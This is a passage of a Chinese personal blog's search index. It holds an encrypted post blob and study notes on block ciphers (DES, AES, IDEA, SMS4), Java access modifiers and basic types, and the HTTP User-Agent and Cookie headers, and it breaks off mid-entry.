fidxqnI+VYZuIPDHJA4P2YbEWuLZjyNc5B0uWVpLzIepcWhngjFfqgXmEXsCrhOCWMCnkd/2ph2LZocpXlXO5q4ArYdtIrIH9QUqFIeTujY/LLm8Gcl5tIexXiDuy/ocofIu10xnJSYPNnxd0S5679wGb1i67GXvllat/VwzOZ7SHAucNCaYXyVs9lgvIowLdObfz0r+C70V8xOXJF6mPxFj5vq0xh0h3ssvxAMtoLmmQTW2x10X1LA7QtwRBWkFFfiIQeIwxmG4aUcmPOYmWxPO/BfZe59YMfZk/QpiR6b5nWT1pMjZ7JEqZieOrSKo8F/cSuj1/n4C97AYynyDkCQ7ZtHX5yBtrLuaa44GgEZVltNJKMhDMVSFMpKEMLXtdQEGphyBMXI78EIWATOp0bxjas5cI5vYZcSKfZWqjPeQ1JAzcMoNOlFPiFmw/ToJtJhz7AenaxTBaC3QKZ76O+oX3Vb/qCMGtZX7qzaPOKbGHlwKSD3f9H1EWkyu6+Qt6pAUOt5hKKeUu41wEcLHjboPSO65dK18ioQoOrmPliHRvt3uYuw/2FbKxZf3XhfHPcl4GYUqOwbf3U51UhtR/lMkfunvJPEdSW452hFcijFj/xp/8x5/iC2arJ1lskaYQE0TnLr6sCpViR2d6Bh/TcRqKLK3hdjxXruLxdDEN8kumdEUbCC65SuDbCOMng+hrdbzuUqzRp2ZE0uuIJTGA4g==</div>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对称密码-分组密码</title>
      <link href="/post/Block-Cipher/"/>
      <url>/post/Block-Cipher/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">DES、AES、IDEA、SMS4</font></center>&ensp;&ensp;<h3 id="一、-DES"><font color="#FF6347" face="Comic sans MS">一、 DES</font><a href="post/Block-Cipher#一、-DES"></a></h3><h4 id="1-1-DES加密算法过程"><font color="#3CB371" face="Comic sans MS">1.1  DES加密算法过程<font></font></font><a href="post/Block-Cipher#1-1-DES加密算法过程"></a></h4><p><a href="https://i.loli.net/2018/12/24/5c208a0084c6e.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/24/5c208a0084c6e.png" alt="DES1"></a><br>&ensp;<br>&ensp;</p><h4 id="1-2-DES子密钥生成过程"><font color="#3CB371" face="Comic sans MS">1.2  DES子密钥生成过程<font></font></font><a href="post/Block-Cipher#1-2-DES子密钥生成过程"></a></h4><p><a href="https://i.loli.net/2018/12/24/5c208a6e71ed4.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/24/5c208a6e71ed4.png" alt="DES子密钥生成过程.png"></a></p><p>&ensp;<br>&ensp;</p><h3 id="二、-AES"><font color="#FF6347" face="Comic sans MS">二、 AES</font><a href="post/Block-Cipher#二、-AES"></a></h3><h4 id="2-1-AES加密算法过程"><font color="#3CB371" face="Comic sans MS">2.1  AES加密算法过程<font></font></font><a href="post/Block-Cipher#2-1-AES加密算法过程"></a></h4><p><a href="https://i.loli.net/2019/01/06/5c31d1a71cb07.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/01/06/5c31d1a71cb07.png" alt="AES算法.png"></a></p><p>&ensp;<br>&ensp;</p><h4 id="2-2-AES子密钥生成过程"><font color="#3CB371" face="Comic sans MS">2.2  AES子密钥生成过程<font></font></font><a href="post/Block-Cipher#2-2-AES子密钥生成过程"></a></h4><p><a href="https://i.loli.net/2019/01/06/5c31d76899c9d.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/01/06/5c31d76899c9d.png" alt="AES密钥.png"></a></p><p>&ensp;<br>&ensp;</p><h3 id="三、-IDEA"><font color="#FF6347" face="Comic sans MS">三、 IDEA</font><a href="post/Block-Cipher#三、-IDEA"></a></h3><h4 id="3-1-IDEA加密算法与子密钥生成"><font color="#3CB371" face="Comic sans MS">3.1  IDEA加密算法与子密钥生成<font></font></font><a href="post/Block-Cipher#3-1-IDEA加密算法与子密钥生成"></a></h4><p><a href="https://i.loli.net/2018/12/24/5c208baac9966.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/24/5c208baac9966.png" alt="IDEA算法1.png"></a></p><p>&ensp;<br>&ensp;</p><h3 id="四、-SMS4"><font color="#FF6347" face="Comic sans MS">四、 SMS4</font><a href="post/Block-Cipher#四、-SMS4"></a></h3><h4 id="4-1-SMS4加密算法与子密钥生成"><font color="#3CB371" face="Comic sans MS">4.1  SMS4加密算法与子密钥生成<font></font></font><a href="post/Block-Cipher#4-1-SMS4加密算法与子密钥生成"></a></h4><p><a href="https://i.loli.net/2018/12/24/5c208bf5102ef.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/24/5c208bf5102ef.png" alt="SMS4密码算法.png"></a></p><p>&ensp;<br>&ensp;<br>&ensp;<br>&ensp;</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分组密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类、成员变量、static访问权限(4.1-4.4)</title>
      <link href="/post/Java-Access-Permissions-3/"/>
      <url>/post/Java-Access-Permissions-3/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><h4 id="一、-Java中类的定义、类访问权限"><font color="#FF6347" face="Comic sans MS">一、 Java中类的定义、类访问权限</font><a href="post/Java-Access-Permissions-3#一、-Java中类的定义、类访问权限"></a></h4><h5 id="1-1-类的定义格式："><font color="#3CB371" face="Comic sans MS">1.1  类的定义格式：<font></font></font><a href="post/Java-Access-Permissions-3#1-1-类的定义格式："></a></h5><p><font color="red"><strong>[修饰符] class 类名 [extends父类名] [implements接口名列表]</strong></font><br>&emsp;<br>&emsp;<br><img src="https://i.loli.net/2018/12/24/5c1fb67d13ec7.png" alt="1"></p><p>&emsp;</p><h5 id="1-2-类修饰符的访问权限："><font color="#3CB371" face="Comic sans MS">1.2  类修饰符的访问权限：<font></font></font><a href="post/Java-Access-Permissions-3#1-2-类修饰符的访问权限："></a></h5><div class="article-bounded"><div class="article-table"><table><thead><tr><th>类修饰符</th><th>访问权限</th></tr></thead><tbody><tr><td><font color="#EE3A8C" face="Arial">缺省(默认方式)</font></td><td><font face="Comic sans MS" color="#EE3A8C">这种类只能被同一个包中的类访问；</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">public(公共)</font></td><td><font face="Comic sans MS" color="#EE3A8C">它修饰的类能被所有的类访问；</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">abstract(抽象)</font></td><td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被实例化，它可能包含有未实现的方法。</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">extends(继承)</font></td><td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明新创建的类继承哪个类, 被继承的类称为此类的父类。extends后面只能跟一个父类名称, 因为Java中一个类最多能继承一个类(单继承)。</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">final(最终)</font></td><td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被继承，即不能有子类。</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">implements (实现)</font></td><td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明这个类实现了哪些接口，接口名可以有多个。</font></td></tr></tbody></table></div></div><p>&emsp;</p><h5 id="1-3-关于类访问权限的总结："><font color="#3CB371" face="Comic sans MS">1.3  关于类访问权限的总结：<font></font></font><a href="post/Java-Access-Permissions-3#1-3-关于类访问权限的总结："></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">1.    具有继承关系的子类可以继承父类的一些成员变量，即可以不创建对象就可以直接访问，如果是      同一个包的子类可以继承到public、缺省和protected修饰的变量，如果是不同的包的子类就只能继承      到public 和protected的；2.    如果是其他类，不管是一个包还是不在一个包，都要创建该类的对象才能引用3.    如果是main方法，不管是本类还是非本类，要访问实例变量都要创建对象，可以引申到其他所有       的类方法中4.    私有成员只能在本类中访问，如果在main方法中访问私有成员 必须创建对象</font></td></tr></table></div></div><p>&ensp;<br>&ensp;</p><h4 id="二、-成员变量访问权限"><font color="#FF6347" face="Comic sans MS">二、 成员变量访问权限</font><a href="post/Java-Access-Permissions-3#二、-成员变量访问权限"></a></h4><p>&ensp;<br><img src="https://i.loli.net/2018/12/24/5c1fbf2618e79.png" alt="2"></p><p>&ensp;<br>&emsp;</p><h5 id="2-1-成员变量访问权限总结为："><font color="#3CB371" face="Comic sans MS">2.1  成员变量访问权限总结为：<font></font></font><a href="post/Java-Access-Permissions-3#2-1-成员变量访问权限总结为："></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**(1) 访问修饰符缺省**访问修饰符缺省时，成员变量只能被同一包(package) 中的所有类访问，所以也称为包(package)变量。(缺省访问修饰符实际是friendly修饰符，但因为friendly不是Java语言的关键字，所以friendly修饰符不能显式说明。）**(2) public(公共)**public修饰的成员变量可以被程序中的任何类所访问。由于public成员变量不受限制, 这易使类的对象引起不希望的修改，建议成员变量尽量不要使用public修饰符。**(3) protected (受保护)**protected修饰的成员变量可以被本包及有继承关系的类自由访问。**(4) private (私有)**private修饰的成员变量只能在同一个类中使用。这种方式通常是最为安全的。</font></td></tr></table></div></div><p>&ensp;<br>&ensp;</p><h4 id="三、-static-静态-——静态变量访问权限"><font color="#FF6347" face="Comic sans MS">三、 static(静态)——静态变量访问权限</font><a href="post/Java-Access-Permissions-3#三、-static-静态-——静态变量访问权限"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6">(1)<font color="green">**static修饰的成员变量称为**</font><font color="#1874CD">**类变量(静态变量)**</font>；<font color="green">**不用static修饰的成员变量又叫**</font><font color="#1874CD">**对象变量(实例变量)。**</font>(2)<font color="red">**区别：</font>**对象变量依附于具体的对象实例，它的值因具体对象实例的不同而不同，而类变量为该类的所有对象所共享，它的值不因类的对象不同而不同。(3)可以通过类来访问静态成员变量，也可以通过该类的对象访问静态成员变量。&ensp;&ensp;<font color="red">**形式：类名.成员变量/对象名.成员变量**</font>(4)<font color="red">**反过来，非staic的对象方法可以直接使用static的类变量**</font>(5)类方法不能直接调用类中的对象方法（非static方法）。(6)定义变量时必须当即赋值。</td></tr></table></div></div><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
            <tag> Java访问权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java语言基础的字符常变量等(3.1-3.3)</title>
      <link href="/post/Java-Language-2-1/"/>
      <url>/post/Java-Language-2-1/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">标识符,注释和分隔符、变量和常量、基本类型</font></center>&ensp;&ensp;<h4 id="一、-标识符、注释和分隔符"><font color="#FF6347" face="Comic sans MS">一、 标识符、注释和分隔符</font><a href="post/Java-Language-2-1#一、-标识符、注释和分隔符"></a></h4><p><font color="red" face="Arial">📒标识符：</font><font face="Arial">是程序员用来标记语言中元素（变量、常量、类、对象等）名称的命名记号。</font></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#B0E0E6">Java中的标识符遵守先定义后使用的原则。即只有定义了的标识符，才可在语句部分使用。</td></tr></table></div></div><p><font color="#EE7942" face="Arial"><strong>Java定义标识符的规则：</strong></font><br>(1)由字母、 数字、下划线、$组成，不能由数字开头<br>(2)不能是Java中的保留字(关键字)；<br>(3)大小写敏感，长度无限制。</p><p>&emsp;</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th>类型</th><th>保留字</th></tr></thead><tbody><tr><td><font color="#EE3A8C" face="Arial">类型保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> boolean, byte, char, short,  int, long,float, double, void</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">语句保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> if, else, switch, case, default, break, for, while, do,return,continue,try,catch,finally,throw,synchronized</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">表达式保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> new, null, this, super</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">修饰符保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> abstract, final, public, private, protected, static, transient, volatile </font></td></tr><tr><td><font color="#EE3A8C" face="Arial">类、方法保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> class, throws, native, instanceof</font></td></tr><tr><td><font color="#EE3A8C" face="Arial">扩展类构筑模块保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> package, import, extends, implements, interface<font face="Comic sans MS" color="#EE3A8C"></font></font></td></tr><tr><td><font color="#EE3A8C" face="Arial">其它保留字</font></td><td><font face="Comic sans MS" color="#EE3A8C"> cast, futuer, generic, inner, oprater, outer, rest,var<font face="Comic sans MS"></font></font></td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h5 id="1-1-标识符"><font color="#3CB371" face="Comic sans MS">1.1  标识符</font><a href="post/Java-Language-2-1#1-1-标识符"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font color face="Comic sans MS">**举例**：合法标识符：     A , a1,  $Systembol,  square,  ex_sa不合法标识符：          1a          （以数字1开头）                       break       （禁止使用保留字）                       TWO  WORDS  （含有空格）                       .NO         （有圆点）</font></td></tr></table></div></div><p>&emsp;</p><h5 id="1-2-注释"><font color="#3CB371" face="Comic sans MS">1.2  注释</font><a href="post/Java-Language-2-1#1-2-注释"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**Java有三种注释形式：**      1.“//” 单行注释。表示从此向后，直到行尾都是注释。      2.“/\*……\*/“ 块注释。在“/\*”和“\*/”之间都是注释。      3.“/\*\*……\*/”文档注释。所有在“/\*\*”和“\*/”之间的内容可以用来自动形成文档。</font></td></tr></table></div></div><p>&emsp;</p><h5 id="1-3-语句"><font color="#3CB371" face="Comic sans MS">1.3  语句</font><a href="post/Java-Language-2-1#1-3-语句"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">与C++一样，Java中的语句也是最小的执行单位。&emsp;&emsp;&emsp;&emsp;各个语句之间以  ;  间隔&emsp;&emsp;&emsp;&emsp;X大括号{   }内的一系列语句称为语句块</font></td></tr></table></div></div><hr><hr><p>&emsp;<br>&emsp;</p><h4 id="二、-变量和常量"><font color="#FF6347" face="Comic sans MS"> 二、 变量和常量</font><a href="post/Java-Language-2-1#二、-变量和常量"></a></h4><h5 id="2-1-变量"><font color="#3CB371" face="Comic sans MS">2.1  变量</font><a href="post/Java-Language-2-1#2-1-变量"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">📒Java的变量有两种：<font color="red">**局部变量  类成员变量**</font>变量必须先定义后使用！变量的定义形式如下：&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<font color="red">类型      变量名表；</font></font></td></tr></table></div></div><blockquote><p>注意：局部变量在使用前必须给定初值，否则，将编译出错，而类成员变量无此要求。</p></blockquote><p><font face="Comic sans MS">如下出现编译错误，缺少“y=8;”</font></p><pre class="line-numbers language-bash"><code class="language-bash">class test<span class="token punctuation">{</span>  int x<span class="token punctuation">;</span>  void method<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      int y<span class="token punctuation">;</span>       System.out.println<span class="token punctuation">(</span>x<span class="token punctuation">)</span>      System.out.println<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token function">test</span> t<span class="token operator">=</span>new test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       t.method<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h6 id="2-1-1-变量名"><font color="#3CB371" face="Comic sans MS">2.1.1  变量名 </font><a href="post/Java-Language-2-1#2-1-1-变量名"></a></h6><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**1. 📒在Java中用标识符来表示变量名**。&emsp;&emsp;1.1 变量名中字母大写和小写是有区别的，如name和Name表示两个不同的变量名；&emsp;&emsp;1.2 变量名标志存放变量值的内存位置，其内存存放的内容是变量的值。**2. 📒命名方法**:2.1 程序员应该为变量取有意义的名称，以利于程序的阅读和理解；2.2 习惯上，变量名以小写字母开头，若一个变量名由超过一个单词所组成，则第一个单词之后的所有单词都以大写字母开头，以便于理解该变量名。&emsp;&emsp;例如，anIntVar</font></td></tr></table></div></div><p>&emsp;</p><h6 id="2-1-2-变量的类型"><font color="#3CB371" face="Comic sans MS">2.1.2   变量的类型 </font><a href="post/Java-Language-2-1#2-1-2-变量的类型"></a></h6><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**变量类型用于表述数据的格式和结构。**📒**Java中的数据类型可分为两大类：**<font color="red">**基本数据类型：**</font>整数类型、实数类型、字符型、布尔型          <font color="red">**构造数据类型：**</font>Java 语言中构造类型用类来描述。</font></td></tr></table></div></div><hr><hr><p>&emsp;<br>&emsp;</p><h4 id="三、-基本数据类型表-变量和常量"><font color="#FF6347" face="Comic sans MS"> 三、 基本数据类型表:变量和常量</font><a href="post/Java-Language-2-1#三、-基本数据类型表-变量和常量"></a></h4><div class="article-img"><p><img src="https://s1.ax1x.com/2018/12/20/Fr1nnP.png" alt="1" data-zoomable></p></div><p>&emsp;</p><h5 id="3-1-整型"><font color="#3CB371" face="Comic sans MS">3.1  整型</font><a href="post/Java-Language-2-1#3-1-整型"></a></h5><div class="article-img"><p><img src="https://s1.ax1x.com/2018/12/20/Fr10NF.png" alt="2" data-zoomable></p></div><p>&emsp;</p><h6 id="3-1-1-整型常量"><font color="#3CB371" face="Comic sans MS">3.1.1  整型常量</font><a href="post/Java-Language-2-1#3-1-1-整型常量"></a></h6><div class="article-img"><p><img src="https://s1.ax1x.com/2018/12/20/Fr1jUS.png" alt="3" data-zoomable></p></div><p>&emsp;</p><h6 id="3-1-2-整型变量"><font color="#3CB371" face="Comic sans MS">3.1.2  整型变量</font><a href="post/Java-Language-2-1#3-1-2-整型变量"></a></h6><div class="article-img"><p><img src="https://s1.ax1x.com/2018/12/20/Fr3S3j.png" alt="4" data-zoomable></p></div><p>&emsp;</p><h5 id="3-2-实型"><font color="#3CB371" face="Comic sans MS">3.2  实型</font><a href="post/Java-Language-2-1#3-2-实型"></a></h5><div class="article-img"><p><img src="https://s1.ax1x.com/2018/12/20/Fr3uvR.png" alt="5" data-zoomable></p></div><p>&emsp;</p><h6 id="3-2-1实型常量有两种表示法："><font color="#3CB371" face="Comic sans MS">3.2.1实型常量有两种表示法：</font><a href="post/Java-Language-2-1#3-2-1实型常量有两种表示法："></a></h6><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**(1)十进制表示法**&emsp;&emsp;-3.5f&emsp;0.0f&emsp;123.45f&emsp;+678.9f      要注意,采用十进制表示法时,小数点的两侧都必须有数字, 缺一不可，如+123．和 .56都是不合法的。**(2)科学表示法：** <font face="Comic sans MS" color="red">**<尾数> E <阶码> **</阶码></尾数></font>&emsp;&emsp;-1.234567E+12&emsp;(-1.2345678901×1012)&emsp;&emsp;尾数&emsp;阶码**注意：**<font color="red">&emsp;&emsp;&emsp;&emsp;尾数必须有，但小数部分可无；&emsp;&emsp;&emsp;&emsp;阶码必须有，必须是整数。&emsp;&emsp;&emsp;&emsp;基数是10</font></font></td></tr></table></div></div>        <div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**下列表示都是不正确的。**&emsp;&emsp;E-6&emsp;&emsp;（缺尾数）&emsp;&emsp;3E&emsp;&emsp;（无阶码）&emsp;&emsp;2.E3&emsp;&emsp;（尾数出错）&emsp;&emsp;2E1.2&emsp;&emsp;（阶码非整数）&emsp;**📒实型变量的定义**例如：float aFloatVar;double aDoubleVar;<font></font></font></td></tr></table></div></div><p>&emsp;</p><h5 id="3-3-布尔型"><font color="#3CB371" face="Comic sans MS">3.3      布尔型</font><a href="post/Java-Language-2-1#3-3-布尔型"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**📒布尔数据类型用于表达逻辑状态：**&emsp;&emsp;布尔型数据只有两个值：true和false。&emsp;&emsp;<font face="Comic sans MS" color="red">**注意: Java中不可将布尔类型看做整型值。true不对应1，false不对应0，不像C++一样。**</font></font></td></tr></table></div></div><p>&emsp;</p><h5 id="3-4-字符型"><font color="#3CB371" face="Comic sans MS">3.4      字符型</font><a href="post/Java-Language-2-1#3-4-字符型"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**📒字符类型用来表示单个字符，采用16位二进制Unicode 编码表示**字符常量是用两个单引号括起来的一个字符&emsp;&emsp;例如： 'A'；  'a'； '2'； '我'；也可用unicode代码表示一个字符常量&emsp;&emsp;例如： '\u0041'</font></td></tr></table></div></div>    <p>&emsp;<br>&emsp;</p><h4 id="四、-Unicode编码"><font color="#FF6347" face="Comic sans MS"> 四、 Unicode编码</font><a href="post/Java-Language-2-1#四、-Unicode编码"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#EEE0E5"><font face="Comic sans MS">**📒Unicode编码：**1. Java的字符使用Unicode编码，使用两个字节(16位)，所以它几乎包括所有字符，中文、日文、…，它支持世   界上所有语言。  2. 大多数语言使用ASCII码，用8位表示一个字符。ASCII码是Unicode码的一个子集，Unicode表示ASCII   码时，其高位为0，它是其前255个字符。Unicode字符通常用十六进制。例如“\u0000”-“\u00ff”表示   ASCII码集。”\u”表示转义字符，它用来表示其后四个十六进制数字是Unicode代码。</font></td></tr></table></div></div> <p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
            <tag> Java语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《HTTP协议请求头部的User-Agen和Cookie》</title>
      <link href="/post/HTTP-User-Agen-Cookie/"/>
      <url>/post/HTTP-User-Agen-Cookie/</url>
      
        <content type="html"><![CDATA[<p>&ensp;</p><h4 id="一、User-Agen"><font color="red">一、User-Agen</font><a href="post/HTTP-User-Agen-Cookie#一、User-Agen"></a></h4><p><strong>注意在HTTP头部参数的首字母大写格式！</strong></p><h5 id="🌸1-1-什么是User-Agen">🌸<font color="red" face="楷体">1.1 什么是User-Agen</font><a href="post/HTTP-User-Agen-Cookie#🌸1-1-什么是User-Agen"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#EDEDED"><font face="楷体"><font color="#008B45">**1.1.1**、</font> Http Header之User-Agen的User-Agen中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。UA可以进行伪装。<font color="red">浏览器的UA字串的标准格式：浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言)渲染引擎标识版本信息</font>。但各个浏览器有所不同。</font></td></tr></table></div></div><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#EDEDED"><font face="楷体"><font color="#008B45">**1.1.2**、</font>用较为普通的一点来说，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器 HTTP 请求时发送到服务器！User-Agen也是用户识别的重要部分，通过分析，能知道用户使用的是什么设备、什么浏览器、什么应用等，进而可以分析其购买力、属性、职业等。</font></td></tr></table></div></div><p>&ensp;</p><h5 id="🌸1-2-对UA字串的说明"><font color="red" face="楷体">🌸1.2 对UA字串的说明</font><a href="post/HTTP-User-Agen-Cookie#🌸1-2-对UA字串的说明"></a></h5><p><font face="楷体"><font color="#008B45"><strong>1.2.1</strong> </font><br><font face="仿体">&emsp;出于兼容及推广等目的，很多浏览器的标识相同，因此浏览器标识并不能说明浏览器的真实版本，真实版本信息在 UA 字串尾部可以找到。</font></font></p><hr><hr><p><font face="仿体"><font color="#008B45"><strong>1.2.2</strong> <strong>操作系统标识</strong></font><br><img src="https://s1.ax1x.com/2018/12/18/FBlnde.jpg" alt="FBlnde.jpg"></font></p><hr><hr><p><font face="仿体"><font color="#008B45"><strong>1.2.3</strong> <strong>加密等级标识</strong></font><br>&emsp;N: 表示无安全加密<br>&emsp;I: 表示弱安全加密<br>&emsp;U: 表示强安全加密</font></p><hr><hr><p><font face="仿体"><font color="#008B45"><strong>1.2.4</strong> <strong>浏览器语言</strong></font><br>&emsp;在首选项 &gt; 常规 &gt; 语言中指定的语言</font></p><hr><hr><p><font face="仿体"><font color="#008B45"><strong>1.2.5</strong> <strong>渲染引擎</strong></font><br>&emsp;显示浏览器使用的主流渲染引擎有：Gecko、WebKit、KHTML、Presto、Trident、Tasman等，格式为：渲染引擎/版本信息</font></p><hr><hr><p><font face="仿体"><font color="#008B45"><strong>1.2.6</strong> <strong>版本信息</strong></font><br>&emsp;显示浏览器的真实版本信息，格式为：浏览器/版本信息<br>注：<br>1、在广告定向设定中，浏览器定向和操作系统定向均是针对User-Agent中的信息进行定向。<br>2、欲了解更多的User-Agent信息，请参考User-Agen 字串史</font></p><hr><hr><p>&ensp;</p><h5 id="🌸1-3-User-Agen的作用"><font color="red">🌸1.3 User-Agen的作用</font><a href="post/HTTP-User-Agen-Cookie#🌸1-3-User-Agen的作用"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#EDEDED"><font face="楷体">通过user-agent不能完全准确的判断是属于那款浏览器。由于UA字符串在每次浏览器HTTP 请求时发送到服务器，所以服务器就可以根据它来做好多事。比如：1、统计用户浏览器使用情况。有些浏览器说被多少人使用了，实际上就可以通过判断每个IP的UA来确定这个IP是用什么浏览器访问的，以得到使用量的数据。2、根据用户使用浏览器的不同，显示不同的排版从而为用户提供更好的体验。有些网站会根据这个来调整打开网站的类型,如是手机的就打开wap，显示非手机的就打开pc常规页面。用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。 既然知道了UA的作用，那么其实客户端也可以使用UA来做一些神奇的事。比如：伪装 User-Agen 来回避某些侦测特定浏览器才能读取的网站。如果使用Firefox浏览器插件User-Agen switcher，用户就可以轻松地在不同UA之间切换，把自己伪装成其他浏览器。这样就可以在PC上预览WAP或移动格式的网页，比如专门为iPhone设计的页面。</font></td></tr></table></div></div><p>&ensp;</p><h4 id="二、Cookie——用户追踪之基础技术"><font color="red">二、Cookie——用户追踪之基础技术</font><a href="post/HTTP-User-Agen-Cookie#二、Cookie——用户追踪之基础技术"></a></h4><h5 id="2-1-关于Cookie"><font color="red" face="楷体">2.1 关于Cookie</font><a href="post/HTTP-User-Agen-Cookie#2-1-关于Cookie"></a></h5><h6 id="2-1-1-前言"><font color="#008B45" face="楷体"><strong>2.1.1 前言</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-1-前言"></a></h6><p><font face="仿体">&emsp;Cookie是如此的重要，以至于我们后面要讲到的回头客定向、访客频次定向、用户定向等等都需要基于此技术才可以实现，并且我们日常工作中所能见到的第三方监测工具如doubleclick、99click、秒针等也都要利用cookie技术，网站分析工具如GA、百度统计、CNZZ等也需要利用Cookie。如果没有Cookie，互联网广告市场将受到巨大打击，尤其对于目前我们谈论的精准广告而言。如果没有Cookie，网站分析也不从做起，遑论优化了。<br></font></p><hr><hr><h6 id="2-1-2-Cookie是什么"><font color="#008B45" face="楷体"><strong>2.1.2 Cookie是什么</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-2-Cookie是什么"></a></h6><p><font face="仿体">&emsp;Cookie在英文中是小甜品的意思，但在计算机语言中，Cookie指的是当你浏览某网站时，网站存储在你电脑上的一个小文本文件，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。它记录了你的用户ID，密码、浏览过的网页、停留的时间等信息，用于用户身份的辨别。Cookie通常是以user@domain格式命名的，user是你的本地用户名，domain是所访问的网站的域名。</font></p><hr><hr><h6 id="2-1-3-为什么要Cookie"><font color="#008B45" face="楷体"><strong>2.1.3 为什么要Cookie</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-3-为什么要Cookie"></a></h6><p><font face="仿体">&emsp;因为HTTP协议是无状态的，对于一个浏览器发出的请求，服务器无法区分是不是同一个来源，无法知道上一次用户做了什么。所以，需要额外的数据用于维护会话。 Cookie 正是这样的一段随HTTP请求一起被传递的额外数据，用于维护浏览器和服务器的会话。我们可以想象一个场景，你没有登录京东时在京东上购物，选择了3件商品放入购物车，在结算时，京东为什么还能知道这三件商品是什么？没错，是Cookie！</font></p><hr><hr><h6 